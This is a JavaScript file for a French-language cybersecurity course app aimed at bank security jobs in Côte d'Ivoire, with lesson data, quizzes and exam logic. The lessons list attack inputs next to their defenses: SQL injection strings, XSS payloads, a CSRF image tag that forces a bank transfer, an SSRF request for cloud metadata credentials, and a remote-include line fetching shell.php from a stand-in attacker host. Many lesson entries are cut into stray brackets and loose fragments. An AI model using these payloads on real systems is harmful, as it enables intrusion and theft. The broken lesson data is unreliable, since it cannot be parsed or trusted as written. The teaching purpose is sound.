{id:106,t:"Signatures numeriques",d:35,
intro:"Une signature numerique prouve l'authenticite et l'integrite d'un message. Elle utilise la cle privee de l'emetteur.",
analogy:"Un sceau de cire numerique infalsifiable.",
sections:[
{titre:"Principe",contenu:"<ol><li>Emetteur : hash du message.</li><li>Chiffre ce hash avec sa cle privee = signature.</li><li>Destinataire : dechiffre avec la cle publique de l'emetteur, compare le hash.</li></ol><p>Si les hashes correspondent et la cle publique est verifiee : message authentique et intact.</p>"},
{titre:"Algorithmes",contenu:"<p><b>RSA-PSS</b>, <b>ECDSA</b>, <b>Ed25519</b> (rapide et sur), <b>DSA</b> (ancien).</p>"},
{titre:"Usages",contenu:"<p>Certificats X.509, code signing (Windows, Android), emails (PGP/S/MIME), JWT, blockchain.</p>"}
],
why:"Verifier qu'un binaire n'a pas ete modifie, qu'un email vient du bon expediteur.",
bank:"Signature electronique de documents, transactions. Obligation legale.",
glo:"<b>Non-repudiation</b> : l'emetteur ne peut nier. <b>PSS</b> : mode de signature RSA moderne.",
pr:["openssl dgst -sha256 -sign priv.pem -out sig f.txt","openssl dgst -sha256 -verify pub.pem -signature sig f.txt"],
er:"Ne jamais signer le message directement, toujours son hash.",
df:"Signer et verifier 3 fichiers differents.",
proj:"Mini PKI de signature sur GitHub.",
q:[{q:"Signature utilise :",a:["Cle publique","Cle privee","Hash seul","Rien"],c:1,e:"Signature = chiffrer hash avec cle privee."},{q:"Verifier signature :",a:["Cle publique","Cle privee","Hash","Rien"],c:0,e:"Cle publique de l'emetteur."}]},

{id:107,t:"PKI et certificats X.509",d:50,

{titre:"Contenu d'un certificat",contenu:"<p>Sujet (CN), emetteur, validite (notBefore/notAfter), cle publique, SANs (domaines), usage, signature CA.</p>"},

{id:108,t:"TLS/SSL en profondeur",d:45,

{titre:"Handshake TLS 1.3",contenu:"<ol><li>ClientHello (versions, ciphers, cle publique ECDHE).</li><li>ServerHello (choix, cle ECDHE, certificat).</li><li>Verification du certificat.</li><li>Derivation des cles de session (AES).</li></ol><p>1 round-trip en TLS 1.3 (vs 2 en 1.2).</p>",svg:"HTTPS"},
{titre:"Ciphers recommandes",contenu:"<p>TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256. <b>Eviter</b> : RC4, DES, 3DES, TLS 1.0/1.1.</p>"},
{titre:"Outils",contenu:"<p><code>openssl s_client -connect site:443 -tls1_3</code>. Test en ligne : ssllabs.com/ssltest.</p>"}
],

glo:"<b>ECDHE</b> : echange de cle ephemere (Perfect Forward Secrecy). <b>AEAD</b> : chiffre + authentifie.",

],

{id:111,t:"Cryptographie post-quantique",d:45,

],

],

{id:116,t:"Cryptanalyse : casser des chiffrements",d:50,

],

{id:122,t:"Injection SQL (SQLi)",d:50,
intro:"Une injection SQL permet d'executer du SQL arbitraire via une entree mal filtree. Critique : acces a toute la base.",
analogy:"Faire dire au serveur autre chose que ce que vous demandez.",
sections:[
{titre:"Types",contenu:"<ul><li><b>In-band</b> : UNION-based, error-based.</li><li><b>Blind</b> : boolean, time-based.</li><li><b>Out-of-band</b> : DNS exfiltration.</li></ul>"},
{titre:"Detection",contenu:"<p>Injecter <code>'</code>, <code>' OR 1=1 --</code>, <code>' UNION SELECT</code>. Outils : sqlmap, Burp.</p>"},
{titre:"Defense",contenu:"<p>Requetes preparees (parametrized queries). Valider entrees. Comptes DB a privileges minimaux. WAF (protection partielle).</p>"}
],
why:"SQLi = faille historique la plus exploitee. Acces base complete.",
bank:"Vol de donnees clients. Amende RGPD/BCEAO.",
glo:"<b>Union</b> : concatenation. <b>Blind</b> : pas de retour direct. <b>WAF</b> : pare-feu web.",
pr:["DVWA SQLi low","sqlmap -u URL","Tester payloads","Tester defense prepared"],
er:"Blacklist ' ne suffit pas. Utilisez des requetes preparees.",
df:"Exploiter DVWA SQLi et proposer un correctif.",
proj:"Write-up SQLi sur GitHub.",
q:[{q:"Defense principale :",a:["WAF","Prepared statements","Blacklist","Rien"],c:1,e:"Requetes preparees = defense de fond."},{q:"' OR 1=1 -- :",a:["XSS","SQLi","CSRF","SSRF"],c:1,e:"Contourne la condition."}]},

{id:123,t:"Cross-Site Scripting (XSS)",d:45,
intro:"XSS injecte du JavaScript malveillant qui s'execute dans le navigateur de la victime.",
analogy:"Faire dire au site : 'Execute ce code pour moi'.",
sections:[
{titre:"Types",contenu:"<ul><li><b>Reflected</b> : payload dans l'URL, immediat.</li><li><b>Stored</b> : stocke en DB, se declenche pour chaque visiteur.</li><li><b>DOM-based</b> : dans le JS client-side.</li></ul>"},
{titre:"Payloads",contenu:"<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>\"><img src=x onerror=alert(1)></code>, <code>javascript:alert(1)</code>.</p>"},
{titre:"Defense",contenu:"<p>Echapper les sorties (HTML encode). CSP (Content Security Policy). Cookies HttpOnly. Frameworks modernes (React, Vue) echappent par defaut.</p>"}
],
why:"XSS permet vol de session, phishing, defacement. Cible des apps bancaires.",
bank:"Vol de session bancaire = prise de compte. CSP obligatoire sur les portails.",
glo:"<b>CSP</b> : Content Security Policy. <b>HttpOnly</b> : cookie inaccessible au JS.",
pr:["DVWA XSS low","Tester payloads","Tester CSP","Cookies HttpOnly"],
er:"Blacklist <script> = contournable.",
df:"Exploiter DVWA XSS et proposer correctif CSP.",
proj:"Write-up XSS avec payloads.",

{id:124,t:"CSRF",d:35,
intro:"CSRF (Cross-Site Request Forgery) force l'utilisateur authentifie a faire une action non desiree.",
analogy:"Un papier signe par la victime, mais que l'attaquant a prepare.",
sections:[
{titre:"Principe",contenu:"<p>Victime connectee a sa banque. Attaquant sur un autre site : <code>&lt;img src=\"https://banque.com/transfer?amount=1000&to=attaquant\"&gt;</code>. Le navigateur envoie les cookies automatiquement.</p>"},
{titre:"Defense",contenu:"<ul><li>Token CSRF aleatoire dans chaque formulaire.</li><li>Cookies SameSite=Lax/Strict.</li><li>Verifier Origin/Referer.</li><li>Re-authentification pour actions sensibles.</li></ul>"}
],
why:"CSRF sur une banque = virement non autorise.",
bank:"Token CSRF + SameSite = obligatoires sur les virements.",
glo:"<b>SameSite</b> : attribut cookie. <b>Token CSRF</b> : anti-CSRF.",
pr:["DVWA CSRF","Construire payload","Tester sans token","Tester avec SameSite"],
er:"Compter uniquement sur Referer = contournable.",
df:"Construire une CSRF de virement (lab) et proposer defense.",
proj:"Write-up CSRF sur GitHub.",
q:[{q:"CSRF :",a:["Execute JS","Force action","Injecte SQL","Rien"],c:1,e:"Action forcee via cookies."},{q:"Defense :",a:["SameSite","Blacklist","WAF seul","Rien"],c:0,e:"SameSite + token."}]},

{id:125,t:"Broken Access Control (IDOR)",d:40,
intro:"IDOR (Insecure Direct Object Reference) : acceder a des ressources d'autres utilisateurs en changeant un identifiant.",
analogy:"Changer le numero de chambre a l'hotel et entrer.",
sections:[
{titre:"Exemple",contenu:"<p><code>GET /api/user/123</code> renvoie vos infos. <code>GET /api/user/124</code> renvoie celles d'un autre. Pas de verification cote serveur.</p>"},
{titre:"Autres cas",contenu:"<ul><li>Vertical : user normal accede a admin.</li><li>Horizontal : user A accede a user B.</li><li>Force browsing : /admin sans verif.</li></ul>"},
{titre:"Defense",contenu:"<p>Verifier systematiquement les permissions serveur. UUID au lieu d'ID sequentiels. Tests automatises.</p>"}
],
why:"Numero 1 OWASP 2021. Frequent dans les APIs.",
bank:"Acces aux comptes d'autres clients = fuite massive.",
glo:"<b>IDOR</b> : acces direct a objet. <b>UUID</b> : identifiant non sequentiel.",
pr:["Changer un ID dans URL","Tester /api/user/X","Burp Intruder","Comparer reponses"],
er:"Cacher l'ID dans JS = securite par obscurite.",
df:"Exploiter un IDOR sur lab (PortSwigger).",
proj:"Write-up IDOR sur GitHub.",
q:[{q:"IDOR :",a:["Injection","Acces objet direct","XSS","CSRF"],c:1,e:"Acces sans verif."},{q:"Defense :",a:["UUID","WAF","Rien","Blacklist"],c:0,e:"UUID + verif serveur."}]},

{id:126,t:"SSRF",d:40,
intro:"SSRF (Server-Side Request Forgery) force le serveur a faire une requete vers une ressource interne.",
analogy:"Se servir du serveur comme proxy pour atteindre l'interne.",
sections:[
{titre:"Impact",contenu:"<p>Acces a des services internes (metadata cloud 169.254.169.254, Redis, MongoDB), contournement firewall, port scanning interne.</p>"},
{titre:"Exemple",contenu:"<p><code>POST /fetch</code> avec <code>url=http://169.254.169.254/latest/meta-data/</code> renvoie les credentials AWS.</p>"},
{titre:"Defense",contenu:"<p>Whitelist domaines. Bloquer IP privees (10., 127., 169.254.). Resolver DNS securise. Pas de suivi de redirect.</p>"}
],
why:"SSRF = acces reseau interne depuis l'exterieur. Critique en cloud.",
bank:"SSRF sur une API bancaire = acces a des services internes sensibles.",
glo:"<b>SSRF</b> : requete serveur. <b>Metadata cloud</b> : 169.254.169.254.",

{titre:"RFI",contenu:"<p><code>?page=http://attaquant.com/shell.php</code> si allow_url_include=On (rare).</p>"},
{titre:"Defense",contenu:"<p>Whitelist de pages. Pas d'inclusion dynamique de chemins utilisateur. disable allow_url_include.</p>"}
],

{id:132,t:"Command injection",d:40,

],

],

{id:134,t:"Deserialization attacks",d:45,

],

{nom:"Bridge Bank CI - Stagiaires Securite", url:"https://ci.eclozion-opportunities.com/opportunite/bridge-bank-recrute-2-stagiaires-en-securite-numerique/", type:"CI Banque - Stage", desc:"Politique securite, pentest, PCI-DSS."},
{nom:"AFG Holding - Stagiaire Cyber", url:"https://yop.l-frii.com/offre-de-stage-a-atlantic-financial-group-holding-afg-holding-29-novembre-2025/", type:"CI Banque - Stage", desc:"DevSecOps, ISO 27001, Kali."},
{nom:"Societe Generale CI - Stages", url:"https://yop.l-frii.com/des-dizaines-dopportunites-de-stage-chez-societe-generale-28-mai-2026/", type:"CI Banque - Stage", desc:"9 metiers dont cyber."},
{nom:"LinkedIn Jobs", url:"https://www.linkedin.com/jobs/", type:"International", desc:"SOC Junior Abidjan."}
];

var state = JSON.parse(localStorage.getItem('cyber_ci_lvl2') || '{"done":{},"exams":{}}');
if (!state.exams) state.exams = {};
Object.keys(state.done).forEach(function(id){ if (state.done[id] === true) state.done[id] = new Date().toISOString(); });
function save(){ localStorage.setItem('cyber_ci_lvl2', JSON.stringify(state)); }
var app = document.getElementById('app');

function todayKey(){ return new Date().toISOString().split('T')[0]; }
function countToday(){ var t = todayKey(); return Object.values(state.done).filter(function(v){ return typeof v === 'string' && v.startsWith(t); }).length; }
function countTotal(){ return Object.keys(state.done).length; }
function passedExamsCount(){ return Object.keys(state.exams).filter(function(k){ return state.exams[k].passed; }).length; }

function isExamUnlocked(ex){
  for (var i = ex.from; i <= ex.to; i++){
    if (!state.done[i]) return false;
  }
  return true;
}
function isExamPassed(ex){
  return !!(state.exams && state.exams[ex.id] && state.exams[ex.id].passed);
}

function updateProg(){
  var done = countTotal(), today = countToday();
  document.getElementById('hs').innerHTML = "Aujourdhui : <b>" + today + "</b> · Defis : <b>" + done + "/" + D.length + "</b> · Examens : <b>" + passedExamsCount() + "/" + EXAMS.length + "</b>";
}

function render(){
  updateProg();
  var today = countToday(), total = countTotal();
  
  var html = '<div class="hero"><h2>Niveau 2 : Cybersecurite Avancee <span class="level-tag l2">NIVEAU 2</span></h2><p>100 defis avances en cryptographie, pentest web, forensics, cloud et SOC. Objectif : analyste SOC ou pentester junior en banque.</p></div>';
  
  html += '<div class="card"><div class="stats-grid"><div class="stat"><span class="big">' + today + '</span><span class="lbl">Aujourdhui</span></div><div class="stat"><span class="big">' + total + '/100</span><span class="lbl">Defis</span></div><div class="stat"><span class="big">' + passedExamsCount() + '/5</span><span class="lbl">Examens</span></div><div class="stat"><span class="big">' + Math.round(total/D.length*100) + '%</span><span class="lbl">Progression</span></div></div>';
  html += '<div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap"><button class="gold" onclick="showCerts()">Certifications</button><button class="gold" onclick="showStats()">Statistiques</button><button class="gold" onclick="showJobs()">Emplois CI</button><button class="sec" onclick="reset()">Reinitialiser</button></div></div>';
  
  var mods = [
    {n:"Module 6 - Cryptographie & PKI", from:101, to:120, cs:120, exam:"E6"},
    {n:"Module 7 - Web Pentest & OWASP", from:121, to:140, cs:140, exam:"E7"},
    {n:"Module 8 - Forensics & IR", from:141, to:160, cs:160, exam:"E8"},
    {n:"Module 9 - Cloud & DevSecOps", from:161, to:180, cs:180, exam:"E9"},
    {n:"Module 10 - SOC avance & Threat Hunting", from:181, to:200, cs:200, exam:"E10"}
  ];
  
  mods.forEach(function(m){
    var defis = D.filter(function(d){ return d.id >= m.from && d.id <= m.to; });
    var done = defis.filter(function(d){ return state.done[d.id]; }).length;
    var cp = CERT_PLAN.filter(function(c){ return c.seuil === m.cs; })[0];
    var exam = EXAMS.filter(function(e){ return e.id === m.exam; })[0];
    var examUnlocked = exam && isExamUnlocked(exam);
    var examPassed = exam && isExamPassed(exam);
    var status = done === defis.length ? 'done' : '';
    
    html += '<div class="card" style="border-left:4px solid #a855f7"><h2 style="color:#e9d5ff">' + m.n + '</h2><p style="color:#94a3b8;font-size:0.8em">' + done + '/' + defis.length + ' defis valides</p>';
    if (cp) {
      var badge = cp.type === 'free' ? 'free' : (cp.type === 'partial' ? 'partial' : 'paid');
      var badgeTxt = cp.type === 'free' ? 'GRATUIT' : (cp.type === 'partial' ? 'PARTIEL' : 'PAYANT');
      html += '<div class="cert ' + status + '"><h4>' + (status?'Debloquee':'A debloquer') + ' - ' + cp.modules + '</h4><div style="font-weight:700;margin:4px 0">' + cp.cert + ' <span class="badge ' + badge + '">' + badgeTxt + '</span></div><div style="font-size:0.85em;color:#94a3b8;margin-top:6px">' + cp.desc + '</div><div style="margin-top:6px"><a href="' + cp.url + '" target="_blank">Site officiel</a></div></div>';
    }
    html += '<div class="grid">';
    defis.forEach(function(d){
      var cls = state.done[d.id] ? 'done' : '';
      html += '<div class="btn ' + cls + '" onclick="show(' + d.id + ')"><span class="n">Defi ' + d.id + '</span><span class="ti">' + d.t + '</span></div>';
    });
    html += '</div>';
    
    if (exam) {
      var cls2 = examPassed ? 'passed' : (examUnlocked ? '' : 'locked');
      var badgeCls = examPassed ? 'passed' : (examUnlocked ? 'ready' : 'locked');
      var badgeTxt2 = examPassed ? 'REUSSI' : (examUnlocked ? 'PRET' : 'VERROUILLE');
      html += '<div class="exam-card ' + cls2 + '"><span class="exam-badge ' + badgeCls + '">' + badgeTxt2 + '</span><h4>' + exam.titre + '</h4>';
      html += '<div class="qcount">' + exam.questions.length + ' questions · Seuil : ' + Math.round(EXAM_PASS_RATIO*100) + '% · ' + exam.duree + ' min</div>';
      if (examPassed) {
        var sc = state.exams[exam.id].score;
        html += '<div style="color:#86efac;font-size:0.85em;margin-top:6px">Score : ' + sc + '/' + exam.questions.length + ' (' + Math.round(sc/exam.questions.length*100) + '%)</div>';
        html += '<div class="nav"><button class="exam" onclick="startExam(\'' + exam.id + '\')">Repasser</button></div>';
      } else if (examUnlocked) {
        html += '<div style="color:#e9d5ff;font-size:0.85em;margin-top:6px">Module complete ! Passez l\'examen.</div>';
        html += '<div class="nav"><button class="exam" onclick="startExam(\'' + exam.id + '\')">Passer l\'examen</button></div>';
      } else {
        var reste = exam.to - done;
        html += '<div style="color:#94a3b8;font-size:0.85em;margin-top:6px">Validez les ' + reste + ' defis restants pour debloquer.</div>';
      }
      html += '</div>';
    }
    
    html += '</div>';
  });
  
  app.innerHTML = html;
  window.scrollTo(0,0);
}

function show(id){
  var d = D.filter(function(x){ return x.id === id; })[0];
  if (!d) return;
  var dateValid = state.done[d.id];
  var dateStr = dateValid ? new Date(dateValid).toLocaleString('fr-FR') : '';
  
  var html = '<div class="card"><div class="meta"><small>Defi ' + d.id + '/200</small><small>' + d.d + ' min</small>' + (dateStr ? '<small style="color:#22c55e">Valide le ' + dateStr + '</small>' : '') + '<small class="level-tag l2">NIVEAU 2</small></div>';
  html += '<h2>Defi ' + d.id + ' : ' + d.t + '</h2>';
  html += '<div class="intro"><h3 style="color:#e9d5ff;margin-top:0">Introduction</h3><p>' + d.intro + '</p></div>';
  html += '<div class="analogy"><b>Analogie :</b> ' + d.analogy + '</div>';
  
  d.sections.forEach(function(s, i){
    html += '<div class="section"><h3>' + (i+1) + '. ' + s.titre + '</h3>' + s.contenu;
    if (s.svg && SVG[s.svg]) {
      html += '<div class="svg-box">' + SVG[s.svg] + '</div>';
    }
    html += '</div>';
  });
  
  html += '<div class="why"><b>Pourquoi en cyber :</b> ' + d.why + '</div>';
  html += '<div class="bank"><b>Pourquoi pour une banque :</b> ' + d.bank + '</div>';
  html += '<div class="glo"><b>Glossaire :</b> ' + d.glo + '</div>';
  html += '<div class="pr"><h3 style="color:#22c55e;margin-top:0">PRATIQUE</h3><ol>';
  d.pr.forEach(function(p){ html += '<li>' + p + '</li>'; });
  html += '</ol></div>';
  html += '<div class="er"><b>Erreur a eviter :</b> ' + d.er + '</div>';
  html += '<div class="df"><b>Exercice final :</b> ' + d.df + '</div>';
  html += '<div class="car"><b>Livrable portfolio :</b> ' + d.proj + '</div>';
  html += '<h3>Quiz</h3><div class="quiz" id="quiz">';
  
  d.q.forEach(function(q, i){
    html += '<div class="q"><b>Q' + (i+1) + '. ' + q.q + '</b>';
    q.a.forEach(function(opt, j){
      html += '<label><input type="radio" name="q' + i + '" value="' + j + '"> ' + opt + '</label>';
    });
    html += '<div class="exp" id="exp' + i + '"></div></div>';
  });
  
  html += '</div><div class="nav"><button class="sec" onclick="render()">Accueil</button><button onclick="validate(' + id + ')">Valider</button></div><div id="res"></div></div>';
  
  app.innerHTML = html;
  window.scrollTo(0,0);
}

function validate(id){
  var d = D.filter(function(x){ return x.id === id; })[0];
  var correct = 0;
  d.q.forEach(function(q, i){
    var sel = document.querySelector('input[name="q' + i + '"]:checked');
    var labels = document.querySelectorAll('input[name="q' + i + '"]');
    labels.forEach(function(inp, j){
      var lbl = inp.parentElement;
      if (j === q.c) lbl.classList.add('ok');
      if (sel && +sel.value === j && j !== q.c) lbl.classList.add('ko');
    });
    var exp = document.getElementById('exp' + i);
    exp.style.display = 'block';
    exp.innerHTML = q.e;
    if (sel && +sel.value === q.c) correct++;
  });
  
  var ok = correct === d.q.length;
  var dejaValide = !!state.done[id];
  document.getElementById('res').innerHTML = '<div class="res ' + (ok?'g':'r') + '">' + (ok ? 'Defi ' + d.id + ' valide !' : 'Score : ' + correct + '/' + d.q.length + ' - Reessayez') + '</div>';
  
  if (ok && !dejaValide) {
    state.done[id] = new Date().toISOString();
    save();
    updateProg();
    var exam = EXAMS.filter(function(e){ return e.from <= id && e.to >= id; })[0];
    if (exam && isExamUnlocked(exam) && !isExamPassed(exam)) {
      document.getElementById('res').innerHTML += '<div class="res g" style="margin-top:8px">Module complete ! <a href="#" onclick="startExam(\'' + exam.id + '\');return false;">Passer l\'examen final</a></div>';
    }
  }
}

var currentExam = null;

function startExam(id){
  var ex = EXAMS.filter(function(e){ return e.id === id; })[0];
  if (!ex) return;
  if (!isExamUnlocked(ex)) { alert("Validez d'abord tous les defis du module."); return; }
  currentExam = ex;
  
  var html = '<div class="card"><div class="meta"><small>Examen ' + ex.id + '</small><small>' + ex.questions.length + ' questions</small><small>Seuil ' + Math.round(EXAM_PASS_RATIO*100) + '%</small><small class="level-tag l2">NIVEAU 2</small></div>';
  html += '<h2>' + ex.titre + '</h2>';
  html += '<div class="intro"><p><b>Instructions :</b> Repondez a toutes les questions. Il faut au moins ' + Math.ceil(ex.questions.length * EXAM_PASS_RATIO) + '/' + ex.questions.length + ' bonnes reponses.</p></div>';
  html += '<div class="quiz" id="examQuiz">';
  
  ex.questions.forEach(function(q, i){
    html += '<div class="q" data-qi="' + i + '"><b>Q' + (i+1) + '. ' + q.q + '</b>';
    q.a.forEach(function(opt, j){
      html += '<label><input type="radio" name="exam_q' + i + '" value="' + j + '"> ' + opt + '</label>';
    });
    html += '<div class="exp" id="exam_exp' + i + '"></div></div>';
  });
  
  html += '</div><div class="nav"><button class="sec" onclick="render()">Annuler</button><button class="exam" onclick="submitExam()">Valider l\'examen</button></div><div id="exam_res"></div></div>';
  
  app.innerHTML = html;
  window.scrollTo(0,0);
}

function submitExam(){
  if (!currentExam) return;
  var ex = currentExam;
  var correct = 0;
  var details = [];
  
  ex.questions.forEach(function(q, i){
    var sel = document.querySelector('input[name="exam_q' + i + '"]:checked');
    var labels = document.querySelectorAll('input[name="exam_q' + i + '"]');
    labels.forEach(function(inp, j){
      var lbl = inp.parentElement;
      if (j === q.c) lbl.classList.add('ok');
      if (sel && +sel.value === j && j !== q.c) lbl.classList.add('ko');
    });
    var exp = document.getElementById('exam_exp' + i);
    exp.style.display = 'block';
    exp.innerHTML = q.e;
    var ok = sel && +sel.value === q.c;
    if (ok) correct++;
    details.push({q: q.q, ok: ok, correct: q.a[q.c], chosen: sel ? q.a[+sel.value] : '(aucune)'});
  });
  
  var ratio = correct / ex.questions.length;
  var passed = ratio >= EXAM_PASS_RATIO;
  var existing = state.exams[ex.id];
  if (!existing || !existing.passed || correct > existing.score) {
    state.exams[ex.id] = {
      score: correct,
      total: ex.questions.length,
      passed: passed,
      date: new Date().toISOString()
    };
    save();
  }
  
  var msg = '';
  if (passed) {
    msg = '<div class="res g">Examen REUSSI ! ' + correct + '/' + ex.questions.length + ' (' + Math.round(ratio*100) + '%)</div>';
    if (!existing || !existing.passed) {
      msg += '<div class="res g" style="margin-top:8px">Felicitations, module valide !</div>';
    }
  } else {
    msg = '<div class="res r">Examen echoue : ' + correct + '/' + ex.questions.length + ' (' + Math.round(ratio*100) + '%) - Il faut ' + Math.ceil(ex.questions.length*EXAM_PASS_RATIO) + '/' + ex.questions.length + '</div>';
  }
  
  msg += '<div class="card" style="margin-top:12px"><h3>Detail des reponses</h3><table><tr><th>#</th><th>Question</th><th>Votre reponse</th><th>Bonne reponse</th><th>Statut</th></tr>';
  details.forEach(function(d, i){
    msg += '<tr><td>' + (i+1) + '</td><td>' + d.q + '</td><td>' + d.chosen + '</td><td>' + d.correct + '</td><td style="color:' + (d.ok?'#22c55e':'#ef4444') + '">' + (d.ok?'OK':'KO') + '</td></tr>';
  });
  msg += '</table></div>';
  
  msg += '<div class="nav"><button class="sec" onclick="render()">Accueil</button><button class="exam" onclick="startExam(\'' + ex.id + '\')">Repasser</button></div>';
  
  document.getElementById('exam_res').innerHTML = msg;
  updateProg();
  window.scrollTo(0, document.body.scrollHeight - 400);
}

function showCerts(){
  var total = countTotal();
  var html = '<div class="card"><button class="sec" onclick="render()">Accueil</button><h2>Certifications Niveau 2</h2>';
  CERT_PLAN.forEach(function(p){
    var status = total >= p.seuil ? 'done' : '';
    var badge = p.type === 'free' ? 'free' : (p.type === 'partial' ? 'partial' : 'paid');
    var badgeTxt = p.type === 'free' ? 'GRATUIT' : (p.type === 'partial' ? 'PARTIEL' : 'PAYANT');
    var exam = EXAMS.filter(function(e){ return e.to === p.seuil; })[0];
    var examPassed = exam && isExamPassed(exam);
    html += '<div class="cert ' + status + '"><h4>' + p.titre + ' - ' + p.modules + '</h4><div style="font-size:0.85em;color:#fbbf24;font-weight:700;margin:4px 0">' + p.seuil + ' defis minimum</div><div style="font-weight:700;margin:4px 0">' + p.cert + ' <span class="badge ' + badge + '">' + badgeTxt + '</span></div><div style="font-size:0.85em;color:#94a3b8;margin-top:6px">' + p.desc + '</div><div style="margin-top:8px"><a href="' + p.url + '" target="_blank">Site officiel</a></div>' + (status==='done'?'<div style="color:#86efac;font-weight:700;margin-top:8px">Debloquee' + (examPassed ? ' ✓ Examen reussi' : ' (examen a passer)') + '</div>':'<div style="color:#94a3b8;margin-top:8px">Encore ' + (p.seuil-total) + ' defis</div>') + '</div>';
  });
  html += '</div>';
  app.innerHTML = html;
}

function showStats(){
  var total = countTotal(), today = countToday();
  var now = new Date();
  var dayOfWeek = now.getDay() || 7;
  var monday = new Date(now); monday.setDate(now.getDate() - dayOfWeek + 1); monday.setHours(0,0,0,0);
  var week = Object.values(state.done).filter(function(v){ return typeof v === 'string' && new Date(v) >= monday; }).length;
  var monthStart = new Date(now.getFullYear(), now.getMonth(), 1);
  var month = Object.values(state.done).filter(function(v){ return typeof v === 'string' && new Date(v) >= monthStart; }).length;
  var milestonesDone = MILESTONES.filter(function(m){ return state.done[m.seuil]; });
  
  var html = '<div class="card"><button class="sec" onclick="render()">Accueil</button><h2>Statistiques</h2>';
  html += '<div class="stats-grid"><div class="stat"><span class="big">' + today + '</span><span class="lbl">Aujourdhui</span></div><div class="stat"><span class="big">' + week + '</span><span class="lbl">Semaine</span></div><div class="stat"><span class="big">' + month + '</span><span class="lbl">Mois</span></div><div class="stat"><span class="big">' + total + '/100</span><span class="lbl">Total</span></div></div>';
  
  html += '<h3>Examens de module</h3>';
  html += '<table><tr><th>Examen</th><th>Score</th><th>Statut</th><th>Date</th></tr>';
  EXAMS.forEach(function(ex){
    var r = state.exams && state.exams[ex.id];
    var statut = r ? (r.passed ? 'REUSSI' : 'ECHOUE') : 'Non passe';
    var color = r ? (r.passed ? '#22c55e' : '#ef4444') : '#94a3b8';
    html += '<tr><td>' + ex.titre + '</td><td>' + (r ? r.score + '/' + r.total : '-') + '</td><td style="color:' + color + ';font-weight:700">' + statut + '</td><td>' + (r ? new Date(r.date).toLocaleString('fr-FR') : '-') + '</td></tr>';
  });
  html += '</table>';
  
  html += '<h3>Projets majeurs atteints</h3>';
  if (milestonesDone.length === 0) {
    html += '<p style="color:#94a3b8">Aucun projet majeur encore atteint.</p>';
  } else {
    html += '<ul>';
    milestonesDone.forEach(function(m){ html += '<li><b>' + m.titre + '</b> - ' + m.date + '<br><span style="color:#94a3b8;font-size:0.85em">' + m.desc + '</span></li>'; });
    html += '</ul>';
  }
  html += '<h3>Historique defis (20 dernieres)</h3><table><tr><th>Defi</th><th>Titre</th><th>Date</th></tr>';
  var entries = Object.entries(state.done).sort(function(a,b){ return new Date(b[1]) - new Date(a[1]); });
  entries.slice(0, 20).forEach(function(e){
    var d = D.filter(function(x){ return x.id === +e[0]; })[0];
    html += '<tr><td>' + e[0] + '</td><td>' + (d?d.t:'?') + '</td><td>' + new Date(e[1]).toLocaleString('fr-FR') + '</td></tr>';
  });
  html += '</table></div>';
  app.innerHTML = html;
}

function showJobs(){
  var html = '<div class="card"><button class="sec" onclick="render()">Accueil</button><h2>Emplois en Cote dIvoire</h2>';
  JOBS.forEach(function(j){
    html += '<div class="job"><h4>' + j.nom + '</h4><div style="font-size:0.75em;color:#94a3b8">' + j.type + '</div><div style="margin:6px 0;font-size:0.88em">' + j.desc + '</div><a href="' + j.url + '" target="_blank">' + j.url + '</a></div>';
  });
  html += '</div>';
  app.innerHTML = html;
}

function reset(){
  if (confirm('Reinitialiser toute la progression du Niveau 2 ?')) {
    localStorage.removeItem('cyber_ci_lvl2');
    location.reload();
  }
}

render();
